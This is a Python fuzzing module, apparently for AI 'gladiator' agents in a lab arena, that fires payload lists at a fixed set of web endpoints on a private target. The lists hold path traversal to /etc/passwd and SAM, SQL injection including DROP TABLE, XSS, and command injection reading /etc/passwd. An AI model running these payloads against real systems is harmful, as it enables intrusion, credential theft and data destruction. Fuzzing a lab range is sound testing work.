"""
Fuzzing Module for Zero-Day Discovery
======================================
This module enables gladiators to discover NEW vulnerabilities through:
1. Fuzzing (sending malformed inputs)
2. Mutation-based learning (evolving known exploits)
3. Anomaly detection (finding weird server behavior)

Usage:
    from fuzzing_module import FuzzingEngine
    
    fuzzer = FuzzingEngine(target_ip="172.20.1.10")
    discoveries = fuzzer.fuzz_all_endpoints()
    fuzzer.save_discoveries()
"""

import requests
import time
import random
import string
import json
import os

class FuzzingEngine:
    def __init__(self, target_ip, port=8000, timeout=2):
        self.target_ip = target_ip
        self.port = port
        self.base_url = f"http://{target_ip}:{port}"
        self.timeout = timeout
        self.discoveries = []
        
        # Known endpoints to test
        self.endpoints = [
            "/health",
            "/api/file",
            "/api/login",
            "/api/fetch",
            "/api/user/0",
            "/api/admin",
            "/redirect",
            "/api/cors-test",
            "/api/env",
            "/api/config",
            "/api/session",
            "/api/auth",
            "/api/attempt",
            "/api/buffer",
        ]
    
    def generate_fuzzing_payloads(self):
        """Generate a variety of malformed/unexpected inputs"""
        payloads = []
        
        # 1. Buffer Overflow Attempts
        for size in [100, 1000, 10000, 100000]:
            payloads.append(("buffer_overflow", "A" * size))
        
        # 2. Path Traversal
        traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        for pattern in traversal_patterns:
            payloads.append(("path_traversal", pattern))
        
        # 3. SQL Injection Variants
        sqli_patterns = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 'a'='a",
            "1' AND '1'='2",
            "'; DROP TABLE users--",
            "' OR '1'='1' /*",
        ]
        for pattern in sqli_patterns:
            payloads.append(("sqli", pattern))
        
        # 4. XSS (Cross-Site Scripting)
        xss_patterns = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
        ]
        for pattern in xss_patterns:
            payloads.append(("xss", pattern))
        
        # 5. Command Injection
        cmd_patterns = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(cat /etc/passwd)",
            "; ping -c 1 127.0.0.1",
        ]
        for pattern in cmd_patterns:
            payloads.append(("command_injection", pattern))
        
        # 6. Format String Attacks
        format_patterns = [
            "%s%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
        ]
        for pattern in format_patterns:
            payloads.append(("format_string", pattern))
        
        # 7. Unicode/Encoding Tricks
        unicode_patterns = [
            "\u0000",  # Null byte
            "\u202e",  # Right-to-left override
            "%00",     # URL-encoded null
            "\x00",    # Hex null
        ]
        for pattern in unicode_patterns:
            payloads.append(("unicode", pattern))
        
        # 8. Integer Overflow
        int_patterns = [
            "2147483647",  # Max int32
            "-2147483648", # Min int32
            "9999999999999999999",
        ]
        for pattern in int_patterns:
            payloads.append(("integer_overflow", pattern))
        
        # 9. Random Mutations (Evolutionary)
        for _ in range(100):
            random_payload = ''.join(random.choices(
                string.ascii_letters + string.digits + string.punctuation,
                k=random.randint(10, 100)
            ))
            payloads.append(("random_mutation", random_payload))
        
        return payloads
    
    def test_payload(self, endpoint, payload_type, payload):
        """Test a single payload against an endpoint"""
        try:
            # Try different HTTP methods
            methods = ['GET', 'POST']
            
            for method in methods:
                if method == 'GET':
                    # Test as query parameter
                    url = f"{self.base_url}{endpoint}?input={payload}"
                    response = requests.get(url, timeout=self.timeout)
                else:
                    # Test as POST data
                    response = requests.post(
                        f"{self.base_url}{endpoint}",
                        data={"input": payload},
                        timeout=self.timeout
                    )
                
                # Analyze response for anomalies
                anomaly = self.detect_anomaly(response, payload_type, payload)
                if anomaly:
                    return anomaly
        
        except requests.exceptions.Timeout:
            return {
                "type": "timeout",
                "endpoint": endpoint,
                "payload_type": payload_type,
                "payload": payload,
                "description": "Request timed out (possible DoS vector)"
            }
        except requests.exceptions.ConnectionError:
            return {
                "type": "crash",
                "endpoint": endpoint,
                "payload_type": payload_type,
                "payload": payload,
                "description": "Server crashed or connection refused"
            }
        except Exception as e:
            return {
                "type": "error",
                "endpoint": endpoint,
                "payload_type": payload_type,
                "payload": payload,
                "description": f"Unexpected error: {str(e)}"
            }
        
        return None
    
    def detect_anomaly(self, response, payload_type, payload):
        """Detect if a response indicates a vulnerability"""
        anomalies = []
        
        # 1. Server Error (500)
        if response.status_code == 500:
            anomalies.append({
                "type": "server_error",
                "severity": "high",
                "payload_type": payload_type,
                "payload": payload,
                "description": f"Server returned 500 error (possible crash)"
            })
        
        # 2. Information Disclosure
        sensitive_keywords = ["password", "root", "admin", "secret", "token", "key", "/etc/passwd", "config"]
        response_text = response.text.lower()
        
        for keyword in sensitive_keywords:
            if keyword in response_text:
                anomalies.append({
                    "type": "info_disclosure",
                    "severity": "critical",
                    "payload_type": payload_type,
                    "payload": payload,
                    "description": f"Response contains sensitive keyword: {keyword}"
                })
                break
        
        # 3. Unusual Response Time (possible timing attack)
        if response.elapsed.total_seconds() > 5:
            anomalies.append({
                "type": "timing_anomaly",
                "severity": "medium",
                "payload_type": payload_type,
                "payload": payload,
                "description": f"Slow response ({response.elapsed.total_seconds()}s)"
            })
        
        # 4. Unusual Response Size
        if len(response.content) > 100000:  # > 100KB
            anomalies.append({
                "type": "size_anomaly",
                "severity": "low",
                "payload_type": payload_type,
                "payload": payload,
                "description": f"Large response ({len(response.content)} bytes)"
            })
        
        # 5. SQL Error Messages (SQLi confirmation)
        sql_errors = ["sql syntax", "mysql", "postgresql", "sqlite", "syntax error"]
        for error in sql_errors:
            if error in response_text:
                anomalies.append({
                    "type": "sqli_confirmed",
                    "severity": "critical",
                    "payload_type": payload_type,
                    "payload": payload,
                    "description": f"SQL error message detected: {error}"
                })
                break
        
        return anomalies[0] if anomalies else None
    
    def fuzz_all_endpoints(self, max_payloads_per_endpoint=50):
        """Fuzz all known endpoints with generated payloads"""
        print(f"🔬 Starting fuzzing campaign against {self.target_ip}...")
        
        payloads = self.generate_fuzzing_payloads()
        total_tests = 0
        
        for endpoint in self.endpoints:
            print(f"  Testing {endpoint}...")
            
            # Sample payloads to avoid overwhelming the server
            sampled_payloads = random.sample(payloads, min(max_payloads_per_endpoint, len(payloads)))
            
            for payload_type, payload in sampled_payloads:
                total_tests += 1
                
                result = self.test_payload(endpoint, payload_type, payload)
                if result:
                    self.discoveries.append(result)
                    print(f"    🔥 DISCOVERY: {result['type']} - {result.get('description', 'Unknown')}")
                
                # Rate limiting (don't DoS the server)
                time.sleep(0.1)
        
        print(f"✅ Fuzzing complete. {total_tests} tests run, {len(self.discoveries)} anomalies found.")
        return self.discoveries
    
    def save_discoveries(self, filename="/gladiator/data/fuzzing_discoveries.json"):
        """Save discovered vulnerabilities to disk"""
        try:
            # Load existing discoveries
            existing = []
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    existing = json.load(f)
            
            # Merge with new discoveries
            existing.extend(self.discoveries)
            
            # Save
            with open(filename, 'w') as f:
                json.dump(existing, f, indent=2)
            
            print(f"💾 Saved {len(self.discoveries)} discoveries to {filename}")
        except Exception as e:
            print(f"❌ Failed to save discoveries: {e}")
    
    def load_discoveries(self, filename="/gladiator/data/fuzzing_discoveries.json"):
        """Load previously discovered vulnerabilities"""
        try:
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    self.discoveries = json.load(f)
                print(f"📖 Loaded {len(self.discoveries)} previous discoveries")
                return self.discoveries
        except Exception as e:
            print(f"❌ Failed to load discoveries: {e}")
        return []


# Example usage
if __name__ == "__main__":
    # Test the fuzzer
    fuzzer = FuzzingEngine(target_ip="172.20.1.10")
    discoveries = fuzzer.fuzz_all_endpoints(max_payloads_per_endpoint=10)
    
    print("\n📊 Summary:")
    print(f"  Total discoveries: {len(discoveries)}")
    
    # Group by type
    by_type = {}
    for d in discoveries:
        t = d['type']
        by_type[t] = by_type.get(t, 0) + 1
    
    for vuln_type, count in by_type.items():
        print(f"  {vuln_type}: {count}")
    
    fuzzer.save_discoveries()
